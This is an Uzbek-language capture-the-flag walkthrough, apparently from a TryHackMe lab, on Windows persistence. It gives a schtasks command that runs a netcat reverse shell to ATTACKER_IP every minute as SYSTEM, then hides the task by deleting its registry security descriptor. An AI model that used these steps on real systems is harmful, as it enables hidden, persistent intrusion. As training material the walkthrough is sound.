### 🎯 **Persistence uchun Scheduled Task (rejalashtirilgan vazifa) yaratish**

Windows tizimlarida payload (zararli dastur yoki buyruq) ni qayta-qayta ishga tushirish uchun rejalashtirilgan vazifalardan foydalanish mumkin. Bu usul tizimda **uzoq muddatli yashirin mavjudlik (persistence)** yaratish uchun ishlatiladi.

---

### 🧰 **1. Task Scheduler yordamida Payload ishga tushirish**

Windows’ning o‘zida mavjud bo‘lgan **Task Scheduler** eng keng tarqalgan rejalashtiruvchi vositadir. Bu vosita yordamida vazifani:

* Aniq vaqtda ishga tushirish
* Doimiy ravishda takrorlash
* Tizimda maxsus voqealar yuz berganda ishga tushirish
  kabi holatlar uchun sozlash mumkin.

**Buyruq satridan** foydalanib rejalashtirilgan vazifalarni boshqarish uchun `schtasks` buyrug‘i mavjud.

---

### 📌 **Misol: Har daqiqada reverse shell ishga tushiruvchi vazifa yaratish**

```cmd
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

**Tushuntirish:**

* `/sc minute` – har daqiqada ishga tushirilsin
* `/mo 1` – har 1 daqiqada
* `/tn THM-TaskBackdoor` – vazifa nomi `THM-TaskBackdoor`
* `/tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449"` – ishga tushiriladigan buyruq: bu yerda `nc64` orqali `cmd.exe` ni masofadagi hujumchiga ulaydi (reverse shell)
* `/ru SYSTEM` – SYSTEM huquqlari bilan ishga tushadi

✅ Bu buyruq muvaffaqiyatli bajarilgach, vazifa har daqiqada reverse shell yuboradi.

---

### ✅ **Yaratilgan vazifani tekshirish:**

```cmd
C:\> schtasks /query /tn thm-taskbackdoor
```

Chiqariladi:

```
Folder: \
TaskName             Next Run Time         Status
===================  ====================  ==========
thm-taskbackdoor     5/25/2022 8:08:00 AM  Ready
```

---

### 🕵️ **2. Vazifani yashirish – ko‘zga ko‘rinmas qilish**

Endi esa foydalanuvchi rejalashtirilgan vazifalarni ko‘rganda, bu backdoor ko‘rinib qolmasligi uchun uni **yashirish** kerak.

Buni **Security Descriptor (SD)** ni o‘chirish orqali amalga oshiramiz. SD – bu rejalashtirilgan vazifaning kimlar ko‘rishi va o‘zgartirishi mumkinligini belgilovchi **ACL (Access Control List)** hisoblanadi. Uni o‘chirsangiz – hech kim, hatto administrator ham bu vazifani ko‘ra olmaydi.

SD Windows reestrida quyidagi yo‘lda joylashgan:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

Har bir vazifaning SD qiymatini faqat **SYSTEM huquqi** bilan o‘chirish mumkin.

---

### 🛠 **SD ni o‘chirish:**

1. **`regedit` dasturini SYSTEM huquqi bilan ochamiz**:

```cmd
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

2. Ochilgan **Regedit** orqali quyidagi yo‘lga o‘tamiz:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor
```

3. O‘sha yerda `SD` degan qiymatni o‘chiramiz.

---

### 🔍 **Endi vazifa yashirin bo‘lib qoladi:**

```cmd
C:\> schtasks /query /tn thm-taskbackdoor
```

Chiqariladi:

```
ERROR: The system cannot find the file specified.
```

➡️ Vazifa hali mavjud, ammo ko‘rinmaydi!

---

### 🐚 **Reverse Shell ni tekshirish:**

Hujumchi mashinasida listener ishga tushuramiz:

```bash
user@AttackBox$ nc -lvp 4449
```

Bir daqiqa ichida `cmd.exe` bilan ulanish bo‘ladi (reverse shell).

---

### 🎯 **Vazifa: flag9 olish**

Shell ichida quyidagi buyruqni bajaramiz:

```cmd
C:\> C:\flags\flag9.exe
```

Bu flagni konsolga chiqaradi.
